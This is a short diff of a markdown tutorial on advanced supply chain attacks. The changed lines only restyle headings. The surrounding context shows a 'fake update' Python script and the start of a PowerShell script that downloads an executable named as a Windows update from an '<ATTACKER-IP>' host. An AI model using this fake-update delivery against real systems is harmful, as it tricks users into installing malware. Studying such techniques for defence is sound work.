@@ -159,7 +159,7 @@ The above **flowchart** provides a structured view of the **advanced supply chai
 vim fake_update.py
 ```
 
-# Paste the following script inside vim:
+📌 Paste the following script inside vim:
 ```
 import time
 print("Updating Software...")
@@ -202,7 +202,7 @@ Get-WmiObject -Query "SELECT * FROM Win32_QuickFixEngineering" | Format-Table -A
 vim update.ps1
 ```
 
-# Paste the following PowerShell script:
+📌 Paste the following PowerShell script:
 ```
 $url = "http://<ATTACKER-IP>:8080/Windows_Update_KB5023152.exe"
 $output = "C:\ProgramData\Windows_Update_KB5023152.exe"
